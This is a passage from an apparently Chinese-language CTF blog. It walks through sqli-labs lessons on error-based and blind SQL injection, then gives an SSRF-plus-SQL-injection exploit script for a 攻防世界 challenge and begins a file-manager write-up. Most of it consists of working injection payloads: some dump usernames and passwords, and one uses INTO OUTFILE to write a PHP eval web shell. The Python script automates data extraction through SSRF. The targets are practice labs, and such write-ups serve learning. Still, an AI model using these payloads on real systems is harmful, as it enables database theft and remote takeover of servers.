information_schema.columns where table_name=&#x27;users&#x27; limit 4,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select concat_ws(&#x27;|||&#x27;,password,username) from users limit 1,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">请注意这个方法是有一定概率的,所以要多试几次</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #</span><br><span class="line"></span><br><span class="line">id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #</span><br><span class="line"></span><br><span class="line">id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 4,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #</span><br><span class="line"></span><br><span class="line">1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select concat_ws(&#x27;|||&#x27;,password,username) from users limit 1,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #</span><br></pre></td></tr></table></figure><h3 id="利用-double-数值类型超出范围进行报错注入"><a href="#利用-double-数值类型超出范围进行报错注入" class="headerlink" title="利用 double 数值类型超出范围进行报错注入"></a><strong>利用 double 数值类型超出范围进行报错注入</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存疑,注不出来哦,推测可能是数据库版本问题,回头再说</span><br><span class="line">id=1&#x27; union select (exp(~(select * FROM (SELECT USER())a))),2,3-- #</span><br></pre></td></tr></table></figure><h3 id="利用-bigint-溢出进行报错注入"><a href="#利用-bigint-溢出进行报错注入" class="headerlink" title="利用 bigint 溢出进行报错注入"></a><strong>利用 bigint 溢出进行报错注入</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也不行哦</span><br><span class="line">id=1&#x27; union select (!(select * from (select user())x)-~0),2,3-- #</span><br></pre></td></tr></table></figure><h3 id="xpath-函数报错注入"><a href="#xpath-函数报错注入" class="headerlink" title="xpath 函数报错注入"></a><strong>xpath 函数报错注入</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))-- #</span><br><span class="line"></span><br><span class="line">id=1&#x27; and extractvalue(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),0x7e))-- #</span><br><span class="line"></span><br><span class="line">id=1&#x27; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 4,1),0x7e))-- #</span><br><span class="line"></span><br><span class="line">id=1&#x27; and extractvalue(1,concat(0x7e,(select concat_ws(&#x27;|||&#x27;,password,username) from users limit 1,1),0x7e))-- #</span><br></pre></td></tr></table></figure><h3 id="利用数据的重复性"><a href="#利用数据的重复性" class="headerlink" title="利用数据的重复性"></a><strong>利用数据的重复性</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x-- #</span><br><span class="line">不会注,咋办</span><br></pre></td></tr></table></figure><h2 id="less-6双注入-双引号-字符串"><a href="#less-6双注入-双引号-字符串" class="headerlink" title="less-6双注入-双引号-字符串"></a>less-6双注入-双引号-字符串</h2><p>这关与上一关基本一致,只是闭合方式变成了”</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1正常</span><br><span class="line">id=1&#x27;正常</span><br><span class="line">id=1&quot;错误 use near &#x27;&quot;1&quot;&quot; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><h2 id="less-7导入文件-字符串"><a href="#less-7导入文件-字符串" class="headerlink" title="less-7导入文件 -字符串"></a>less-7导入文件 -字符串</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203161306209.png" alt="image-20220316130608071"></p><p>提示已经很明显了,写文件进去</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1正常</span><br><span class="line">id=1&#x27;错误You have an error in your SQL syntax</span><br><span class="line">id=1&quot;正确</span><br><span class="line">是单引号闭合,接着测试</span><br><span class="line">id=1&#x27; and 1=1--+ 报错,说明不止有单引号闭合</span><br><span class="line">id=1&#x27;) and 1=1--+ 报错,说明不止一个括号</span><br><span class="line">id=1&#x27;)) and 1=1--+正常,说明是一个单引号加两个括号闭合</span><br></pre></td></tr></table></figure><p>这里接下来可以使用布尔盲注,也可以使用时间盲注,</p><p><strong>布尔盲注</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;))and length(database())=8--+回显You are in.... Use outfile......</span><br><span class="line">id=1&#x27;))and length(database())=0--+回显You have an error in your SQL syntax</span><br></pre></td></tr></table></figure><p><strong>时间盲注</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;))and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- #无明显延时</span><br><span class="line">id=1&#x27;))and If(ascii(substr(database(),1,1))=114,1,sleep(5))-- # 有明显延时</span><br></pre></td></tr></table></figure><p><strong>写入文件</strong></p><ol><li><p>首先我们要得到网站的绝对路径,但是在单纯在这一关中,我们无从得知网站的绝对路径,所以我们需要从其他的地方去寻找网站的绝对路径,这里我们从前面的关卡中得到一下</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-1/?id=-1&#x27; union select 1,2,@@datadir--+</span><br><span class="line">回显 Your Password:D:\Data\secquan\tools\Environment\PhpStudy\PHPTutorial\MySQL\data\</span><br><span class="line">这里我在sqlilabs目录下面新建了一个file目录用来写入数据</span><br><span class="line">D:\Data\secquan\tools\Environment\PhpStudy\PHPTutorial\WWW\sqlilabs\file</span><br></pre></td></tr></table></figure></li><li><p>读写权限测试</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;))and (select count(*) from mysql.user)&gt;0 --+</span><br><span class="line">回显正常 You are in.... Use outfile......</span><br></pre></td></tr></table></figure></li><li><p>利用into outfile写入文件</p><p> 注意这里如果写不进去的话可能是因为secure_file_priv参数的原因</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">作用主要是用来限制load data,select...outfile load_file 传到那个指定的目录</span><br><span class="line">当secure_file_priv的值为null时,表示限制mysql不允许导入,导出</span><br><span class="line">当secure_file_priv的值为/tmp/,表示限制mysql的导入,导出只能发生在/tmp/目录下</span><br><span class="line">当secure_file_priv的值没有具体的值&quot;&quot;时表示不对mysql的导入导出做出限制</span><br><span class="line">修改</span><br><span class="line">进入mysql的安装目录,找到my.ini修改里面的secure_file_priv参数为&quot;&quot;</span><br><span class="line">如果没有发现的话在最后面添加一个: secure_file_priv=&quot;&quot;</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#x27;zf&#x27;]);?&gt;&quot; into outfile &quot;D:\\Data\\secquan\\tools\\Environment\\PhpStudy\\PHPTutorial\\WWW\\sqlilabs\\file\\zf.php&quot; -- #</span><br><span class="line">这里可以发现当使用&#x27;&#x27;单引号时发现写不进去,使用&quot;&quot;双引号时可以写进去,接着连接就好</span><br></pre></td></tr></table></figure><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203161940506.png" alt="image-20220316194043361"></p></li></ol><h2 id="less-8盲注-基于布尔值单引号"><a href="#less-8盲注-基于布尔值单引号" class="headerlink" title="less-8盲注-基于布尔值单引号"></a>less-8盲注-基于布尔值单引号</h2><p>基本测试说明是单引号闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and 1=1--+ 回显正常</span><br><span class="line"></span><br><span class="line">id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #</span><br><span class="line">回显错误</span><br><span class="line"></span><br><span class="line">id=1&#x27;and length(database())=8--+回显正常</span><br><span class="line">id=1&#x27;and length(database())=7--+回显错误</span><br></pre></td></tr></table></figure><h2 id="less-9盲注-基于时间-单引号"><a href="#less-9盲注-基于时间-单引号" class="headerlink" title="less-9盲注 - 基于时间 - 单引号"></a>less-9盲注 - 基于时间 - 单引号</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1You are in...........</span><br><span class="line">id=1&#x27;You are in...........</span><br><span class="line">id=1&quot; You are in...........</span><br></pre></td></tr></table></figure><p>全部回显一样,说明无法使用布尔盲注.时间盲注试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and sleep(5)-- #无延时</span><br><span class="line">id=1&#x27; and sleep(5)-- #延时五秒</span><br><span class="line">id=1&quot; and sleep(5)-- #无延时</span><br></pre></td></tr></table></figure><p>说明是基于单引号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and if (length(database())=7 ,sleep(5),1)--+无延时</span><br><span class="line">id=1&#x27; and if (length(database())=8 ,sleep(5),1)--+延时五秒</span><br></pre></td></tr></table></figure><h2 id="less-10-盲注-基于时间-双引号"><a href="#less-10-盲注-基于时间-双引号" class="headerlink" title="less-10 盲注 - 基于时间 - 双引号"></a>less-10 盲注 - 基于时间 - 双引号</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1You are in...........</span><br><span class="line">id=1&#x27;You are in...........</span><br><span class="line">id=1&quot; You are in...........</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and sleep(5)-- #无延时</span><br><span class="line">id=1&#x27; and sleep(5)-- #无延时</span><br><span class="line">id=1&quot; and sleep(5)-- # 延时五秒</span><br></pre></td></tr></table></figure><p>说明是基于双引号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&quot;and if (length(database())=7 ,sleep(5),1)--+无延时</span><br><span class="line">id=1&quot; and if (length(database())=8 ,sleep(5),1)--+延时五秒</span><br></pre></td></tr></table></figure><h2 id="盲注的总结"><a href="#盲注的总结" class="headerlink" title="盲注的总结"></a>盲注的总结</h2><h3 id="基于布尔盲注"><a href="#基于布尔盲注" class="headerlink" title="基于布尔盲注"></a>基于布尔盲注</h3><p>三大截取函数:mid(),substr(),left()</p><p><strong>mid()</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此函数为截取字符串的一部分,mid(column_name,start,length)</span><br><span class="line">column_nmae:需要提取的字符字段</span><br><span class="line">start:规定开始的位置</span><br><span class="line">length:要返回的字段数</span><br><span class="line">mid(database(),1,1)&gt;&#x27;a&#x27;:查看数据库名的第一位</span><br></pre></td></tr></table></figure><p><strong>substr()与substring()</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr()和substring()函数实现的功能是一样的</span><br><span class="line">string substring(string,start,length)</span><br><span class="line">string substr(string,start,length)</span><br><span class="line">参数描述同mid参数,第一个为要处理的字符串,start为开始位置,length为截取的长度</span><br></pre></td></tr></table></figure><p><strong>left()</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left()得到字符串左部指定个数的字符串</span><br><span class="line">left(string,n)string为要截取的字符串,n为长度</span><br></pre></td></tr></table></figure><p><strong>ord()</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">返回第一个字符的ascii码,经常与上面的函数进行组合使用</span><br><span class="line">ord(mid(database(),1,1))&gt;114意思就是检测database()的第一位ascii码是否大于114</span><br></pre></td></tr></table></figure><p><strong>ascii()</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换为 ascii 值</span><br></pre></td></tr></table></figure><h3 id="正则注入"><a href="#正则注入" class="headerlink" title="正则注入"></a>正则注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 判断第一个表名的第一个字符是否是a-z中的字符,其中blind_sqli是假设已知的库名。</span><br><span class="line"></span><br><span class="line">注：正则表达式中 ^[a-z] 表示字符串中开始字符是在 a-z范围内</span><br><span class="line"></span><br><span class="line">index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#x27;^[a-z]&#x27; LIMIT 0,1) /*</span><br><span class="line"></span><br><span class="line">2. 判断第一个字符是否是a-n中的字符</span><br><span class="line"></span><br><span class="line">index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#x27;^[a-n]&#x27; LIMIT 0,1)/*</span><br><span class="line"></span><br><span class="line">3. 确定该字符为n</span><br><span class="line"></span><br><span class="line">index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#x27;^n&#x27; LIMIT 0,1) /*</span><br><span class="line"></span><br><span class="line">4. 表达式的更换如下</span><br><span class="line"></span><br><span class="line">expression like this: &#x27;^n[a-z]&#x27; -&gt; &#x27;^ne[a-z]&#x27; -&gt; &#x27;^new[a-z]&#x27; -&gt; &#x27;^news[a-z]&#x27; -&gt; FALSE</span><br><span class="line"></span><br><span class="line">这时说明表名为news ，要验证是否是该表明 正则表达式为&#x27;^news$&#x27;，但是没这必要 直接判断 table_name = ’news‘ 不就行了。</span><br><span class="line"></span><br><span class="line">5.接下来猜解其它表了 （只需要修改 limit 1,1 -&gt; limit 2,1就可以对接下来的表进行盲注了）这里是错误的！！！</span><br><span class="line"></span><br><span class="line">regexp匹配的时候会在所有的项都进行匹配。例如：</span><br><span class="line"></span><br><span class="line">security数据库的表有多个，users，email等</span><br><span class="line"></span><br><span class="line">select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and table_name regexp &#x27;^u[a-z]&#x27; limit 0,1);是正确的</span><br><span class="line"></span><br><span class="line">select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and table_name regexp &#x27;^us[a-z]&#x27; limit 0,1);是正确的</span><br><span class="line"></span><br><span class="line">select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and table_name regexp &#x27;^em[a-z]&#x27; limit 0,1);是正确的</span><br><span class="line"></span><br><span class="line">select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and table_name regexp &#x27;^us[a-z]&#x27; limit 1,1);不正确</span><br><span class="line"></span><br><span class="line">select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and table_name regexp &#x27;^em[a-z]&#x27; limit 1,1);不正确</span><br><span class="line"></span><br><span class="line">实验表明：在limit 0,1下，regexp会匹配所有的项。我们在使用regexp时，要注意有可能有多个项，同时要一个个字符去爆破。类似于上述第一条和第二条。而此时limit 0,1此时是对于where table_schema=&#x27;security&#x27; limit 0,1。table_schema=&#x27;security&#x27;已经起到了限定作用了，limit有没有已经不重要了</span><br></pre></td></tr></table></figure><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">▲select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) from information_schema.columns group by a;</span><br><span class="line"></span><br><span class="line">//explain:此处有三个点，一是需要 count 计数，二是 floor，取得 0 or 1，进行数据的重复，三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为 mysql 的 bug 的问题。但是此处需要将 rand(0)，rand()需要多试几次才行。</span><br><span class="line"></span><br><span class="line">以上语句可以简化成如下的形式。</span><br><span class="line"></span><br><span class="line">select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</span><br><span class="line"></span><br><span class="line">如果关键的表被禁用了，可以使用这种形式</span><br><span class="line"></span><br><span class="line">select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2))</span><br><span class="line"></span><br><span class="line">如果 rand 被禁用了可以使用用户变量来报错</span><br><span class="line"></span><br><span class="line">select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</span><br><span class="line"></span><br><span class="line">▲select exp(~(select * FROM(SELECT USER())a)) //double 数值类型超出范围</span><br><span class="line"></span><br><span class="line">//Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上</span><br><span class="line"></span><br><span class="line">可以参考 exp 报错文章：http://www.cnblogs.com/lcamry/articles/5509124.html</span><br><span class="line"></span><br><span class="line">▲select !(select * from (select user())x) -（ps:这是减号） ~0</span><br><span class="line"></span><br><span class="line">//bigint 超出范围；~0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上</span><br><span class="line"></span><br><span class="line">可以参考文章 bigint 溢出文章 http://www.cnblogs.com/lcamry/articles/5509112.html</span><br><span class="line"></span><br><span class="line">▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) se//mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</span><br><span class="line"></span><br><span class="line">▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql对xml数据进行查询和修改的 xpath 函数，xpath 语法错误</span><br><span class="line"></span><br><span class="line">▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</span><br><span class="line"></span><br><span class="line">//mysql 重复特性，此处重复了 version，所以报错。</span><br></pre></td></tr></table></figure><h3 id="延时注入-1"><a href="#延时注入-1" class="headerlink" title="延时注入"></a>延时注入</h3><p><strong>sleep</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p><strong>benchmark()</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 sleep()函数进行注入。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界ics-02</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cisc-2/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cisc-2/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界isc-2"><a href="#攻防世界isc-2" class="headerlink" title="攻防世界isc-2"></a>攻防世界isc-2</h1><p>扫目录<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141737810.png" alt="image-20220314173657709"></p><p><strong>download.php</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141737377.png" alt="image-20220314173750346"></p><p><strong>downloads</strong></p><p>目录有文件浏览漏洞</p><p><strong>login</strong></p><p>下有个paper</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141739473.png" alt="image-20220314173902436"></p><p>点一下跳转到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:65396///index.php/login/download.php?dl=ssrf</span><br></pre></td></tr></table></figure><p>下载下来一个pdf里面是多半是ssrf</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141743103.png" alt="image-20220314174342021"></p><p><strong>js</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141740414.png" alt="image-20220314174023371"></p><p><strong>secret</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141740440.png" alt="image-20220314174047400"></p><p><strong>secret.php</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141745816.png" alt="image-20220314174517774"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141749787.png" alt="image-20220314174949746"></p><p><strong>secret_debug.php</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141746017.png" alt="image-20220314174635982"></p><p>显示ip错误,那么这里就应该是ssrf的利用.这里是secret_debug.php说明结构应该和secret差不多,那么这里就可以注入了.</p><p>这里小试一下sql注入</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141922521.png" alt="image-20220314192223424"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;txtfirst_name&quot;</span>:<span class="string">&quot;1&#x27;&quot;</span>,<span class="comment">#单引号出现报错</span></span><br><span class="line"> right syntax to use near <span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;01/10/2019&#x27;</span>,<span class="string">&#x27;3541534&#x27;</span>)<span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;txtfirst_name&quot;:&#x27;</span><span class="number">1</span><span class="string">&quot;&#x27;,  #回显正常</span></span><br><span class="line"><span class="string"> right syntax to use near &#x27;5&#x27;,&#x27;01/10/2019&#x27;,&#x27;1516838&#x27;)&#x27; at line 1  </span></span><br></pre></td></tr></table></figure><p>并且在那么处爆了一个4</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141927199.png" alt="image-20220314192746161"></p><p>说明txtLast_name这里有回显,那么我们需要将语句构造到这里那么的话就需要使用&#x2F;**&#x2F;进行闭合一下下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141931569.png" alt="image-20220314193105531"></p><p>最终闭合之后在4处回显数据库名称</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141931266.png" alt="image-20220314193137234"></p><p>python</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://111.200.241.244:65396/download.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&#x27;s=3&amp;txtfirst_name=w%27%23&amp;txtmiddle_name=q&amp;txtLast_name=q&amp;txtname_suffix=w&amp;txtdob=22%2F11%2F1111&amp;txtdl_nmbr=1234561&amp;txtRetypeDL=1234561&amp;btnContinue2=Continue&#x27;</span></span><br><span class="line">s1 = s1.replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&quot;,&quot;&#x27;</span>)</span><br><span class="line">s1 = s1.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;:&quot;&#x27;</span>)</span><br><span class="line"><span class="comment">#print(s1)这里替换一下</span></span><br><span class="line">subquery = <span class="string">&quot;database()&quot;</span><span class="comment">#获取数据库名</span></span><br><span class="line"><span class="comment">#ssrfw</span></span><br><span class="line">subquery = <span class="string">&quot;select table_name from information_schema.tables where table_schema=&#x27;ssrfw&#x27; limit 1&quot;</span></span><br><span class="line"><span class="comment">#cetcYssrf</span></span><br><span class="line">subquery = <span class="string">&quot;select column_name from information_schema.columns where table_name=&#x27;cetcYssrf&#x27; limit 1,1&quot;</span></span><br><span class="line"><span class="comment">#secretName</span></span><br><span class="line">subquery = <span class="string">&quot;select column_name from information_schema.columns where table_name=&#x27;cetcYssrf&#x27; limit 1,1&quot;</span></span><br><span class="line"><span class="comment">#value</span></span><br><span class="line">subquery = <span class="string">&quot;select value from cetcYssrf limit 1&quot;</span></span><br><span class="line"><span class="comment">#flag&#123;cpg9ssnu_OOOOe333eetc_2018&#125;</span></span><br><span class="line"><span class="built_in">id</span> = random.randint(<span class="number">1</span>,<span class="number">10000000</span>)</span><br><span class="line">params = &#123;<span class="string">&quot;s&quot;</span>:<span class="string">&quot;3&quot;</span>,</span><br><span class="line">          <span class="string">&quot;txtfirst_name&quot;</span>:<span class="string">&quot;L&#x27;,&#x27;1&#x27;,(&quot;</span>+subquery+<span class="string">&quot;),&#x27;1&#x27;/*&quot;</span>,</span><br><span class="line">          <span class="string">&quot;txtmiddle_name&quot;</span>:<span class="string">&quot;q&quot;</span>,</span><br><span class="line">          <span class="string">&quot;txtLast_name&quot;</span>:<span class="string">&quot;q&quot;</span>,</span><br><span class="line">          <span class="string">&quot;txtname_suffix&quot;</span>:<span class="string">&quot;w&quot;</span>,</span><br><span class="line">          <span class="string">&quot;txtdob&quot;</span>:<span class="string">&quot;*/,&#x27;01/10/2019&quot;</span>,</span><br><span class="line">          <span class="string">&quot;txtdl_nmbr&quot;</span>:<span class="built_in">id</span>,</span><br><span class="line">          <span class="string">&quot;txtRetypeDL&quot;</span>:<span class="built_in">id</span>,</span><br><span class="line">          <span class="string">&quot;btnContinue2&quot;</span>:<span class="string">&quot;Continue&quot;</span>&#125;</span><br><span class="line">d = <span class="string">&#x27;http://127.0.0.1/secret/secret_debug.php?&#x27;</span>+urllib.parse.urlencode(params)</span><br><span class="line">req = requests.get(url,params=&#123;<span class="string">&quot;dl&quot;</span>:d&#125;)</span><br><span class="line"><span class="built_in">print</span>(req.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界filemanager</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cfilemanager/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cfilemanager/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传配合二次注入"><a href="#文件上传配合二次注入" class="headerlink" title="文件上传配合二次注入"></a>文件上传配合二次注入</h1><p>扫目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203131651570.png" alt="image-20220313165115499"></p><p>下载<a href="http://www.tar.gz文件得到源码/">www.tar.gz文件得到源码</a></p><p><strong>xdctf.sql</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET NAMES utf8;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = 0;</span><br><span class="line"></span><br><span class="line">DROP DATABASE IF EXISTS `xdctf`;</span><br><span class="line">CREATE DATABASE xdctf;</span><br><span class="line">USE xdctf;</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `file`;</span><br><span class="line">CREATE TABLE `file` (</span><br><span class="line">  `fid` int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `filename` varchar(256) NOT NULL,</span><br><span class="line">  `oldname` varchar(256) DEFAULT NULL,</span><br><span class="line">  `view` int(11) DEFAULT NULL,</span><br><span class="line">  `extension` varchar(32) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`fid`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS = 1;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里是数据库的信息主要提供给几个关键字段,有oldname    filename    extension</p><p><strong>common.inc.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: phithon</span></span><br><span class="line"><span class="comment"> * Date: 15/10/14</span></span><br><span class="line"><span class="comment"> * Time: 下午7:58</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$DATABASE</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line"><span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;ayshbdfuybwayfgby&quot;</span>,</span><br><span class="line"><span class="string">&quot;dbname&quot;</span> =&gt; <span class="string">&quot;xdctf&quot;</span>,</span><br><span class="line">);<span class="comment">#数据库连接的基本量</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable">$DATABASE</span>[<span class="string">&#x27;host&#x27;</span>], <span class="variable">$DATABASE</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$DATABASE</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$DATABASE</span>[<span class="string">&#x27;dbname&#x27;</span>]);</span><br><span class="line"><span class="variable">$req</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span 